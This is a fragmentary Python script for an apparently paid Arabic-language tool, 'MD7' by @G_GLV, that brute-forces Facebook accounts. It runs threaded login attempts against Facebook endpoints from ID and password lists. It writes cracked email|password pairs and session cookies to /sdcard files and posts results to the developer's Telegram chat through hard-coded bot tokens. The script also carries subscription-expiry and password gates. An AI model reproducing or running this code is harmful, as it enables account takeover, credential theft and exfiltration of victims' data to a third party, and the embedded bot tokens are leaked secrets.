...
end_datetime = datetime.datetime(2024,6, 17, 0, 0, 0) #
...
print(f"[-] \x1b[1;92m\x1b[38;5;211mالوقت المتبقي 🥲💔\x1b[38;5;122m : {remaining_time}")

if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
    print("[!] خلص الاشتراك راسل المطور\x1b[38;5;122m يفعلك🔥🤞🏿 @G_GLV") #
    exit(0)
...
print('\x1b[1;97mنورت ادات MD7 ولك المطور @G_GLV')
import requests
...
def compare_phone_time():
    try:
        ...
        print(f"نورت ادات MD7 المدفوعه 🤍🫣😁")
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2024,9,16)
if now >=target:print("MD7developer tools have   been activated ⛄@G_GLV⛄")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
if pss ==yso:
 pass
 print("\033[1;32m          You are logged in to MD7tools  ")
 time.sleep(1)
 os.system('clear')
else:
 exit('\033[1;31m            Error logging in to MD7tools  ')       
...
print(G + '▲────────────────◇◆◇────────────────▲         ')
print('')
print(E + 'تم تحديث الاداة بتاريخ 2024/6/2 اداة مودي المدفوعة🦸')
print('')
print(G + '▲────────────────◇◆◇────────────────▲          ')
print('\x1b[2;36m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧           ) \n\n  \x1b[38;5;210m➩ \x1b[1;33m[⚀]  \x1b[2;32mDEVELOPER  : الـمـطـور مودي\n  \x1b[38;5;210m➩ \x1b[1;33m[⚁]  \x1b[2;32mMY CHANNEL : @G_GLV\n  \x1b[38;5;210m➩ \x1b[1;33m[⚂]  \x1b[2;32mTOOL       : آداه MD7 الـمـدفــوعة\n  \x1b[38;5;210m➩ \x1b[1;33m[⚃]  \x1b[2;32mTELEGRAM   : @G_GLV\n\x1b[\x1b[2;36m\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧            ')

token = ('6824870359:AAE6GhA_AK0LuuWhh7s8MOAGkv5rPwThUbI')
print('✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓃬✧ ✦ ✧ ✦ ✧              \n  \n')
print('\x1b[2;34mتاريخ تحديث الاداه 2024/6/2 🔥🇮🇶\n\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧  )\n\n   『@G_GLV』  ☞ 『لُـِـِِـِِِـِِـِـوُفُـ,ـي』                 \n\n')

print('\n')
ID = ('6381264963')
tlg1 = '\nتم تشغيل آداة لمدة 24 ساعه 🕛 ارسل صور صيد تمديد صلاحيا 🔥🫀\n• معرف قناتي ➪ @G_GLV •————————————\n ────────⧏  مودي ⧐────────\nشكرا لك على تشغيل اداتنا المدفوعة نتمنى لك تجربة ممتعة 🔥❤  ➩ \n  مودي\n    \n ارسل صور الصيد لخـوك مودي ..@G_GLV #     @G_GLV\n\n⋘─────━𓅓 مودي𓅓─────━⋙  '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))

token = ('7384567684:AAFT9mOUEkD3w3ZMfbiPuvrfugkW2sxYDeI')
print('✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓃬✧ ✦ ✧ ✦ ✧              \n  \n')
print('\x1b[2;34mتاريخ تحديث الاداه 2024/6/2 🔥🇮🇶\n\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧  )\n\n   『@G_GLV』  ☞ 『لُـِـِِـِِِـِِـِـوُفُـ,ـي』                 \n\n')
...
print('\x1b[38;5;205mYou have been successfully registered in the G_GLV tool 🔥😎')


#exec(zlib.decompress().MGDTWU())
...
def linex():
        print('\033[1;37m__________________________________')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n• MGDTWU By @G_GLV•\n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/G_GLV.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print('\x1b[1;33mΑнмєɒ Αℓ-Мυταωαя is yσυя υиcℓє   \033[1;94m: \033[1;96m'+total_ids)
                                        
                                        print("\033[1;32m الـ ايـكار 𝐓𝐇𝐄 𝐈𝐊𝐀𝐑 𓃠︎ 𝔱𝔬𝔬𝔩 ")
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mG_GLV\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''
\r{G7}𝙶𝙾𝙾𝙳 ✔	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @G_GLV ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ مہحہمہد ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• 𝙱𝚈 : @MGDTWU - @G_GLV
	  ...
	  ᯓᯓᯓᯓᯓ مہحہمہد ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @G_GLV - @MGDTWU
				...
				'''
                                ...
                                open('/sdcard/G_GLV-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/G_GLV-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
	  ...
	  ᯓᯓᯓᯓᯓ مہحہمہد ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @G_GLV - @MGDTWU
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/G_GLV-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [G_GLV] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ مہحہمہد ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @G_GLV - @MGDTWU
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [G_GLV-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/G_GLV-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [G_GLV-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/G_GLV-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/G_GLVCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [G_GLV-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/G_GLV-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/G_GLV_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [G_GLV-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/G_GLV-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
